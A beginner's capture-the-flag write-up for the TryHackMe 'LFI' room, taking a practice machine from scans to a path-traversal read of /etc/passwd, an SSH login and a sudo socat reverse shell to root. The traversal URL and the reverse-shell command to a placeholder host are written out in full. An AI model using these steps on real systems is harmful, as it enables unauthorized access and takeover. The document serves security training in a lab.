@@ -1,0 +1,90 @@
+This is a write up for the beginner level room LFI on tryhackme.com
+
+This room is designed for people to get familiar with local file inclusion
+
+There are two flags we need to get the user flag and the root flag. Pretty normal stuff
+
+Going with a normal nmap scan to start things of
+
+nmap -sS -sV -A 10.10.135.17
+
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDH1X4Cqbxb5okQZBN3LvsIM8dYZOxeMWlReUkWWp+ICQ+6RjVs+bSbShCPac1Zc+lbnfHte1ZRtMW8a3OodW02+8PXcDbZlmMNMWUQmM76D2NZz28PDC7vouYqSQGt6J6gfsTq2YqCMVPU28uoJ/Qvg5C6hM3oFFDztV2BN7Pj+SgZ8a5htxv5wgn/PtWju2CJCQzPhLUrkAlrSb97/YQcvtjwXUGzKGHo62Cl6GINLm3nAVqJnNpm7aWcKowdfnEsrp+S41W5xV1gl4CyvE9usk5LfQwlPDF50FCgzsidA7mn4NbTukdTsNMAOTe0oAmjXAE0q/KCT076stYjRphX
+|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPvYRKovqOIYhJN1NV8r3T3YTa4N40XFZaWSQjuYyZIsuL6D8Xn9C4v925gPkS/wZyYBh7CRt6CcSbd2ekPByzo=
+|   256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAd782HHJj9kHBKUMOUOgfWVBU9LdeGrlTDQ+Z0hD8yI
+80/tcp open  http    syn-ack ttl 63 Werkzeug httpd 0.16.0 (Python 3.6.9)
+| http-methods: 
+|_  Supported Methods: HEAD OPTIONS GET
+|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
+|_http-title: My blog
+
+We see two open port. We've got the ssh port open on 22 as expected and http on 80.
+The interesting thing from a glance is the blog available on the http port so let's go check it out.
+
+We are presented with a blog about hacking, LFI and RFI
+
+A quick skim through the code shows some comments but nothing super easy like credentials. I also see a search bar which could be usefull but first I'm going to run a GoBuster scan to see what we have going on.
+
+gobuster dir -u http://10.10.135.17 -w /usr/share/wordlists/dirb/common.txt
+
+While running the gobuster scan I read the articles on the blog which explained how we are going to get access to the machine.
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.135.17
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/05/05 18:32:08 Starting gobuster in directory enumeration mode
+===============================================================
+/article              (Status: 500) [Size: 290]
+                                               
+===============================================================
+2021/05/05 18:34:43 Finished
+===============================================================
+
+and Gobuster showed us nothing usefull. Normally I would check for other folders using dirb or other tools but this is a beginner room LFI room so that is obviously the way forward.
+
+Running a quick check for LFI i changed url to:
+	http://10.10.135.17/article?name=../../../etc/passwd
+
+This presents us with the passwd file and we can use ssh on a username:password we find in the file.
+
+ssh user@IP
+password
+
+ls 
+cat user.txt
+
+and the first flag is right there. So far so good.
+
+Now we're in as a user but we need to get to the root flag. So it's time for sudo -l
+
+Matching Defaults entries for falconfeast on inclusion:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User falconfeast may run the following commands on inclusion:
+    (root) NOPASSWD: /usr/bin/*****
+
+And look ***** needs no password to runs as root so  lets go check out gtfobins for ennumeration
+
+We go to the gtfo page for ***** and it shows us how to create a reverse shell.
+
+If you're new like me you'll use the wrong command a few times, but here's the command to run on the ssh
+
+sudo /usr/bin/socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
+
+look around go find the root flag. It's in the same place it always is /root/root.txt
+
+I hope you enjoyed this quick and easy room.
